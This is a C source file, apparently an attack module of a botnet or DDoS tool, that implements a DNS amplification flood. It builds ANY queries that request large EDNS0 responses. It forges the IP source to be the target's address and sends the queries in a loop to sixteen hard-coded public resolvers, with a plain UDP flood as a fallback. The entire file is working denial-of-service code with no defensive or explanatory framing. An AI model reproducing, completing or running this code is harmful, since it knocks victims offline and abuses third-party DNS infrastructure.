#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "dns_attack.h"
#include "../headers/protocol.h"

#define DNS_PORT 53
#define DNS_SOCKS 64

static const char* dns_resolvers[] = {
    "8.8.8.8",    "8.8.4.4",
    "1.1.1.1",    "1.0.0.1",
    "208.67.222.222", "208.67.220.220",
    "9.9.9.9",    "149.112.112.112",
    "64.6.64.6",  "64.6.65.6",
    "77.88.8.8",  "77.88.8.1",
    "185.228.168.9","185.228.169.9",
    "76.76.19.19", "76.223.122.150",
};
#define RESOLVER_COUNT 16

typedef struct {
    uint16_t id, flags, qdcount, ancount, nscount, arcount;
} __attribute__((packed)) dns_header;

typedef struct {
    uint16_t qtype, qclass;
} __attribute__((packed)) dns_question;

static uint16_t ip_checksum(uint16_t* buf, int nwords) {
    uint32_t sum = 0;
    while (nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static int encode_domain(const char* domain, uint8_t* buf) {
    int pos = 0;
    const char* s = domain;
    const char* dot;
    while ((dot = strchr(s, '.')) != NULL) {
        int len = dot - s;
        buf[pos++] = len;
        memcpy(buf + pos, s, len);
        pos += len;
        s = dot + 1;
    }
    int len = strlen(s);
    if (len > 0) { buf[pos++] = len; memcpy(buf + pos, s, len); pos += len; }
    buf[pos++] = 0;
    return pos;
}

static int build_dns_query(uint8_t* buf, const char* domain) {
    dns_header* hdr = (dns_header*)buf;
    hdr->id      = (uint16_t)(rand() & 0xFFFF);
    hdr->flags   = htons(0x0100);
    hdr->qdcount = htons(1);
    hdr->ancount = hdr->nscount = 0;
    hdr->arcount = htons(1);

    int qname_len = encode_domain(domain, buf + sizeof(dns_header));
    dns_question* q = (dns_question*)(buf + sizeof(dns_header) + qname_len);
    q->qtype  = htons(255); // ANY
    q->qclass = htons(1);

    int len = sizeof(dns_header) + qname_len + sizeof(dns_question);

    // EDNS0 OPT record — requests 4096 byte response
    uint8_t* edns = buf + len;
    edns[0] = 0;
    *(uint16_t*)(edns+1) = htons(41);
    *(uint16_t*)(edns+3) = htons(4096);
    *(uint32_t*)(edns+5) = 0;
    *(uint16_t*)(edns+9) = 0;
    return len + 11;
}

void* dns_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    attack_option* opt_domain = find_option(params, OPT_PAYLOAD);
    const char* domain = (opt_domain && opt_domain->data && opt_domain->len > 0)
                         ? (const char*)opt_domain->data : "google.com";

    uint8_t query[512];
    int query_len = build_dns_query(query, domain);

    // Try raw socket first (spoof src = target → amplification)
    int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    int use_raw = 0;
    if (raw_fd >= 0) {
        int one = 1;
        if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == 0)
            use_raw = 1;
        else
            { close(raw_fd); raw_fd = -1; }
    }

    int fds[DNS_SOCKS];
    int active = 0;
    int sndbuf = 512 * 1024;

    if (!use_raw) {
        for (int i = 0; i < DNS_SOCKS; i++) {
            fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (fds[i] < 0) { fds[i] = -1; continue; }
            setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            fcntl(fds[i], F_SETFL, O_NONBLOCK);
            active++;
        }
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    if (use_raw) {
        // Amplification: spoof src = target, send to all resolvers
        uint8_t pkt[512 + sizeof(struct iphdr) + sizeof(struct udphdr)];
        while (params->active) {
            for (int r = 0; r < RESOLVER_COUNT && params->active; r++) {
                memset(pkt, 0, sizeof(pkt));
                struct iphdr*  ip  = (struct iphdr*)pkt;
                struct udphdr* udp = (struct udphdr*)(pkt + sizeof(struct iphdr));
                uint8_t*       dat = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);

                // New transaction ID each packet
                ((dns_header*)query)->id = (uint16_t)(rand() & 0xFFFF);
                memcpy(dat, query, query_len);

                ip->ihl      = 5; ip->version = 4; ip->tos = 0;
                ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + query_len);
                ip->id       = htons(rand() & 0xFFFF);
                ip->frag_off = 0; ip->ttl = 64;
                ip->protocol = IPPROTO_UDP;
                ip->saddr    = params->target_addr.sin_addr.s_addr; // spoofed
                ip->daddr    = inet_addr(dns_resolvers[r]);
                ip->check    = ip_checksum((uint16_t*)ip, sizeof(struct iphdr)/2);

                udp->source = htons(rand() % 65535);
                udp->dest   = htons(DNS_PORT);
                udp->len    = htons(sizeof(struct udphdr) + query_len);
                udp->check  = 0;

                struct sockaddr_in dst;
                dst.sin_family      = AF_INET;
                dst.sin_port        = htons(DNS_PORT);
                dst.sin_addr.s_addr = ip->daddr;

                sendto(raw_fd, pkt, ntohs(ip->tot_len), MSG_NOSIGNAL, (struct sockaddr*)&dst, sizeof(dst));
            }
            if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
        }
        close(raw_fd);
    } else {
        // No raw socket — plain UDP to resolvers
        while (params->active) {
            ((dns_header*)query)->id = (uint16_t)(rand() & 0xFFFF);
            for (int r = 0; r < RESOLVER_COUNT && params->active; r++) {
                struct sockaddr_in dst;
                dst.sin_family      = AF_INET;
                dst.sin_port        = htons(DNS_PORT);
                dst.sin_addr.s_addr = inet_addr(dns_resolvers[r]);
                for (int i = 0; i < DNS_SOCKS; i++) {
                    if (fds[i] == -1) continue;
                    sendto(fds[i], query, query_len, MSG_NOSIGNAL, (struct sockaddr*)&dst, sizeof(dst));
                }
            }
            if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
        }
        for (int i = 0; i < DNS_SOCKS; i++)
            if (fds[i] != -1) close(fds[i]);
    }

    return NULL;
}
